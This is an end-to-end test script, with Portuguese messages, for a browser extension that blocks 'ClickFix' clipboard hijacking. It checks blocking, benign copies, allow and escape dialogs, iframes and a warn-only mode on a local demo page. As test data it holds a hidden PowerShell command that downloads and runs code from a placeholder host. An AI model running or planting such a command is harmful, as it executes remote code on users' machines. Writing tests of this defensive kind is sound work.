import { createServer } from "node:http";
import { readFile, writeFile } from "node:fs/promises";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { chromium } from "playwright";

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
const testPage = await readFile(path.join(root, "test", "pages", "clickfix-demo.html"));
const server = createServer((_request, response) => {
  response.writeHead(200, { "content-type": "text/html; charset=utf-8" });
  response.end(testPage);
});
const payload = 'powershell -w hidden -c "iwr exemplo.invalid/a | iex"';
const benign = "texto normal para controle";
const outcomes = [];
let context;
let worker;

async function setMode(mode) {
  await worker.evaluate((value) => chrome.storage.local.set({ protectionMode: value }), mode);
}

async function readClipboard(page) {
  return page.evaluate(() => navigator.clipboard.readText());
}

async function setClipboard(page, text) {
  await page.evaluate((value) => navigator.clipboard.writeText(value), text);
}

async function waitForState(frameOrPage, state) {
  try {
    await frameOrPage.waitForFunction(
      (value) => document.querySelector("[data-clip-guard-state]")?.getAttribute("data-clip-guard-state") === value,
      state,
      { timeout: 7000 }
    );
  } catch (error) {
    const details = await frameOrPage.evaluate(() => ({
      hook: {
        mode: window.__clip_guard_hook_state__?.protectionMode,
        pending: window.__clip_guard_hook_state__?.pendingWrites?.size,
        listenersInstalled: window.__clip_guard_hook_state__?.listenersInstalled
      },
      state: document.querySelector("[data-clip-guard-state]")?.getAttribute("data-clip-guard-state"),
      clipboardPatch: Object.hasOwn(Object.getPrototypeOf(navigator.clipboard).writeText, "toString"),
      dataTransferPatch: Object.hasOwn(DataTransfer.prototype.setData, "toString"),
      execCommandPatch: Object.hasOwn(Document.prototype.execCommand, "toString")
    })).catch(() => null);
    throw new Error(`${String(error?.message || error).split("\n")[0]} ${JSON.stringify(details)}`);
  }
}

async function diagnostic(method, origin) {
  const deadline = Date.now() + 7000;
  while (Date.now() < deadline) {
    const result = await worker.evaluate(async ({ expectedMethod, expectedOrigin }) => {
      const { writeDiagnostics = {} } = await chrome.storage.local.get("writeDiagnostics");
      const entries = Object.entries(writeDiagnostics).flatMap(([tabId, value]) =>
        (Array.isArray(value) ? value : [value]).map((entry) => ({ tabId, ...entry }))
      );
      return entries.filter((entry) =>
        entry.method === expectedMethod && entry.origin === expectedOrigin
      ).at(-1) || null;
    }, { expectedMethod: method, expectedOrigin: origin });
    if (result) return result;
    await new Promise((resolve) => setTimeout(resolve, 100));
  }
  throw new Error(`Diagnóstico não registrado: ${method}`);
}

async function clickShadowButton(page, label) {
  const session = await context.newCDPSession(page);
  try {
    const { root: documentNode } = await session.send("DOM.getDocument", { depth: -1, pierce: true });
    const textOf = (node) => [
      node.nodeValue || "",
      ...(node.children || []).map(textOf),
      ...(node.shadowRoots || []).map(textOf)
    ].join("");
    const visit = (node) => [
      node,
      ...(node.children || []).flatMap(visit),
      ...(node.shadowRoots || []).flatMap(visit)
    ];
    const button = visit(documentNode).find((node) =>
      node.nodeName === "BUTTON" && textOf(node).trim() === label
    );
    if (!button) throw new Error(`Botão Clip Guard não encontrado: ${label}`);
    const { model } = await session.send("DOM.getBoxModel", { nodeId: button.nodeId });
    const points = [0, 2, 4, 6].map((index) => [
      model.content[index],
      model.content[index + 1]
    ]);
    const x = points.reduce((sum, point) => sum + point[0], 0) / points.length;
    const y = points.reduce((sum, point) => sum + point[1], 0) / points.length;
    await page.mouse.click(x, y);
  } finally {
    await session.detach();
  }
}

async function record(name, action) {
  try {
    await action();
    outcomes.push({ name, passed: true });
  } catch (error) {
    outcomes.push({ name, passed: false, error: String(error?.message || error).split("\n")[0] });
  }
}

async function blockedPath(page, button, method) {
  const origin = new URL(page.url()).origin;
  const sentinel = `clipboard-before-${button}`;
  await setClipboard(page, sentinel);
  await page.locator(`#${button}`).click();
  await waitForState(page, "block-dialog");
  if (await readClipboard(page) !== sentinel) throw new Error("O clipboard foi alterado antes da decisão");
  const event = await diagnostic(method, origin);
  if (event.blocked !== true || event.level === "none") {
    throw new Error(`Diagnóstico não indica bloqueio: ${JSON.stringify(event)}`);
  }
  const pendingBefore = await page.evaluate(() =>
    window.__clip_guard_hook_state__?.pendingWrites?.size
  );
  await clickShadowButton(page, "Keep blocked");
  await page.waitForTimeout(50);
  const responseState = await page.evaluate(() => ({
    pending: window.__clip_guard_hook_state__?.pendingWrites?.size
  }));
  if (responseState.pending === pendingBefore) {
    throw new Error(`Resposta de bloqueio não chegou ao hook: ${JSON.stringify(responseState)}`);
  }
  if (await readClipboard(page) !== sentinel) throw new Error("Manter bloqueado alterou o clipboard");
}

async function benignPath(page, button) {
  await setClipboard(page, "previous benign value");
  await page.locator(`#${button}`).click();
  await page.waitForTimeout(250);
  if (await readClipboard(page) !== benign) throw new Error("A cópia benigna não chegou ao clipboard");
  if (await page.locator('[data-clip-guard-state="block-dialog"]').count()) {
    throw new Error("Texto benigno abriu o diálogo de bloqueio");
  }
}

await new Promise((resolve) => server.listen(0, "127.0.0.1", resolve));
try {
  const extensionPath = path.join(root, "dist", "chromium");
  context = await chromium.launchPersistentContext("", {
    channel: "msedge",
    headless: false,
    args: ["--lang=en-US", `--disable-extensions-except=${extensionPath}`, `--load-extension=${extensionPath}`]
  });
  worker = context.serviceWorkers().find((serviceWorker) =>
    serviceWorker.url().startsWith("chrome-extension://")
  ) || await context.waitForEvent("serviceworker", { timeout: 7000 });
  const origin = `http://127.0.0.1:${server.address().port}`;
  await context.grantPermissions(["clipboard-read", "clipboard-write"], { origin });
  await setMode("block");
  const page = await context.newPage();
  await page.goto(`${origin}/test/pages/clickfix-demo.html`);

  for (const [button, method] of [
    ["try-write-text", "navigator.clipboard.writeText"],
    ["try-write", "navigator.clipboard.write"],
    ["try-exec-copy", "document.execCommand('copy')"],
    ["try-exec-cut", "document.execCommand('cut')"],
    ["try-event-copy", "DataTransfer.setData"],
    ["try-event-cut", "DataTransfer.setData"]
  ]) {
    await record(`Bloqueia ${button}, mantém clipboard, exibe aviso e registra evento`, () =>
      blockedPath(page, button, method)
    );
  }

  for (const button of [
    "benign-write-text",
    "benign-write",
    "benign-exec-copy",
    "benign-exec-cut",
    "benign-event-copy",
    "benign-event-cut"
  ]) {
    await record(`Cópia benigna sem atraso perceptível por ${button}`, () =>
      benignPath(page, button)
    );
  }

  await record("Permitir mesmo assim grava o ClipboardItem retido", async () => {
    const sentinel = "clipboard-before-allow";
    await setClipboard(page, sentinel);
    await page.locator("#try-write").click();
    await waitForState(page, "block-dialog");
    await clickShadowButton(page, "Allow anyway");
    await page.waitForFunction(
      () => document.querySelector('[data-clip-guard-state="alert"]'),
      undefined,
      { timeout: 7000 }
    );
    if (await readClipboard(page) !== payload) throw new Error("O texto retido não foi gravado");
    const html = await page.evaluate(async () => {
      const [item] = await navigator.clipboard.read();
      return item.getType("text/html").then((blob) => blob.text());
    });
    if (!html.includes(`<p>${payload}</p>`)) throw new Error("O formato HTML retido não foi gravado");
  });

  await record("Esc mantém a gravação bloqueada", async () => {
    const sentinel = "clipboard-before-escape";
    await setClipboard(page, sentinel);
    await page.locator("#try-write-text").click();
    await waitForState(page, "block-dialog");
    await page.keyboard.press("Escape");
    await page.waitForTimeout(100);
    if (await readClipboard(page) !== sentinel) throw new Error("Escape permitiu a gravação");
  });

  await record("Iframe bloqueia payload e informa o contexto", async () => {
    await setClipboard(page, "clipboard-before-iframe");
    await page.evaluate(() => {
      const frame = document.createElement("iframe");
      frame.id = "test-frame";
      frame.src = location.href;
      document.body.append(frame);
    });
    await page.waitForFunction(() =>
      document.querySelector("#test-frame")?.contentDocument?.readyState === "complete"
    );
    const frame = page.frames().find((candidate) =>
      candidate !== page.mainFrame() && candidate.url().startsWith(origin)
    );
    if (!frame) throw new Error("Iframe de teste não carregou");
    await frame.locator("#try-write-text").click();
    await waitForState(page, "block-dialog");
    if (await readClipboard(page) !== "clipboard-before-iframe") {
      throw new Error("Iframe alterou o clipboard");
    }
    const event = await diagnostic("navigator.clipboard.writeText", origin);
    if (!event.blocked || !event.reasons.includes("iframe")) {
      throw new Error(`Contexto iframe ausente: ${JSON.stringify(event)}`);
    }
    await page.keyboard.press("Escape");
  });

  await record("Modo só aviso permite a colagem e avisa", async () => {
    await setMode("warn");
    const warnPage = await context.newPage();
    await warnPage.goto(`${origin}/test/pages/clickfix-demo.html`);
    await warnPage.waitForTimeout(250);
    const modes = await warnPage.evaluate(() => ({
      mode: window.__clip_guard_hook_state__?.protectionMode,
      localMode: window.localStorage.getItem("protectionMode")
    }));
    if (modes.mode !== "warn") {
      const stored = await worker.evaluate(async () =>
        (await chrome.storage.local.get("protectionMode")).protectionMode
      );
      throw new Error(`Modo aviso não chegou ao hook (hook=${modes.mode}, storage=${stored})`);
    }
    await warnPage.locator("#try-write-text").click();
    await waitForState(warnPage, "alert");
    if (await readClipboard(warnPage) !== payload) throw new Error("Modo aviso não gravou o conteúdo");
    const prevented = await warnPage.evaluate(() => {
      const field = document.querySelector("#paste-target");
      const transfer = new DataTransfer();
      transfer.setData("text/plain", 'powershell -w hidden -c "iwr exemplo.invalid/a | iex"');
      return field.dispatchEvent(new ClipboardEvent("paste", {
        clipboardData: transfer,
        bubbles: true,
        cancelable: true
      })) === false;
    });
    if (prevented) throw new Error("Modo só aviso bloqueou o evento paste");
    await waitForState(warnPage, "paste-warning");
    await warnPage.close();
  });

  await page.close();
} finally {
  await context?.close();
  await new Promise((resolve) => server.close(resolve));
}

const passed = outcomes.filter(({ passed: result }) => result).length;
const report = [
  "# Testes E2E de bloqueio do clipboard",
  "",
  `Resultado: ${passed}/${outcomes.length} passaram.`,
  "",
  "| Cenário | Resultado | Observação |",
  "| --- | --- | --- |",
  ...outcomes.map(({ name, passed: result, error }) =>
    `| ${name} | ${result ? "PASSOU" : "FALHOU"} | ${error ?? ""} |`
  ),
  ""
].join("\n");
await writeFile(path.join(root, "reports", "blocking-e2e.md"), report);
console.log(report);
if (passed !== outcomes.length) process.exitCode = 1;
